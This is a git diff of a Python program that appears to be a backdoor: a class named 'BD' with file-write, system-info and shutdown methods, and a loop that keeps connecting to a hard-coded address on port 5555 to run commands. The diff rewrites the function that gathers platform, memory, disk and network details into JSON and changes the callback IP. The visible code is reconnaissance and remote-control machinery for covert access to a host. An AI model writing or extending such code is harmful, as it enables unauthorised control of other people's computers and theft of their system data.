@@ -191,39 +191,76 @@ class BD:
         except Exception as e:
             return f"[-] Write file error: {str(e)}"
         
-    def system_info(self):
-            """รวบรวมข้อมูลระบบ"""
-            try:
-                info = {
-                    'platform': platform.platform(),
-                    'processor': platform.processor(),
-                    'memory': {
-                        'total': psutil.virtual_memory().total,
-                        'available': psutil.virtual_memory().available,
-                        'percent': psutil.virtual_memory().percent
-                    },
-                    'disks': [],
-                    'network': str(psutil.net_if_addrs()),
-                    'boot_time': psutil.boot_time()
-                }
+        
+    # def system_info(self):
+    #         try:
+    #             info = {
+    #                 'platform': platform.platform(),
+    #                 'processor': platform.processor(),
+    #                 'memory': {
+    #                     'total': psutil.virtual_memory().total,
+    #                     'available': psutil.virtual_memory().available,
+    #                     'percent': psutil.virtual_memory().percent
+    #                 },
+    #                 'disks': [],
+    #                 'network': str(psutil.net_if_addrs()),
+    #                 'boot_time': psutil.boot_time()
+    #             }
                 
-                # แก้ไขการเข้าถึงข้อมูล disk
-                for partition in psutil.disk_partitions():
-                    try:
-                        partition_usage = psutil.disk_usage(partition.mountpoint)
-                        info['disks'].append({
-                            'device': partition.device,
-                            'mountpoint': partition.mountpoint,
-                            'total': partition_usage.total,
-                            'used': partition_usage.used,
-                            'free': partition_usage.free
-                        })
-                    except:
-                        continue
+    #             #การเข้าถึงข้อมูล disk
+    #             for partition in psutil.disk_partitions():
+    #                 try:
+    #                     partition_usage = psutil.disk_usage(partition.mountpoint)
+    #                     info['disks'].append({
+    #                         'device': partition.device,
+    #                         'mountpoint': partition.mountpoint,
+    #                         'total': partition_usage.total,
+    #                         'used': partition_usage.used,
+    #                         'free': partition_usage.free
+    #                     })
+    #                 except:
+    #                     continue
                         
-                return str(info)
-            except Exception as e:
-                return f"[-] System info error: {str(e)}"
+    #             return json.dump(info)
+    #         except Exception as e:
+    #             return f"[-] System info error: {str(e)}"
+
+
+
+    def system_info(self):
+        try:
+            info = {
+                'platform': platform.platform(),
+                'processor': platform.processor(),
+                'memory': {
+                    'total': str(psutil.virtual_memory().total),
+                    'available': str(psutil.virtual_memory().available),
+                    'percent': str(psutil.virtual_memory().percent)
+                },
+                'disks': [],
+                'network': str(psutil.net_if_addrs()),
+                'boot_time': str(psutil.boot_time())
+            }
+            
+            for partition in psutil.disk_partitions():
+                try:
+                    usage = psutil.disk_usage(partition.mountpoint)
+                    info['disks'].append({
+                        'device': str(partition.device),
+                        'mountpoint': str(partition.mountpoint),
+                        'total': str(usage.total),
+                        'used': str(usage.used),
+                        'free': str(usage.free)
+                    })
+                except:
+                    continue
+                    
+            return json.dumps(info)  # แทนที่ str() ด้วย json.dumps()
+        except Exception as e:
+            return f"[-] System info error: {str(e)}"
+
+
+        
         
     def system_shutdown(self):
         try:
@@ -317,7 +354,7 @@ if __name__ == "__main__":
     try:
         while True:
             try:
-                server_bd = BD("192.168.1.135", 5555)
+                server_bd = BD("192.168.1.101", 5555)
                 server_bd.run_cmd()
             except Exception as e:
                 print(f"[-] Error: {str(e)}")
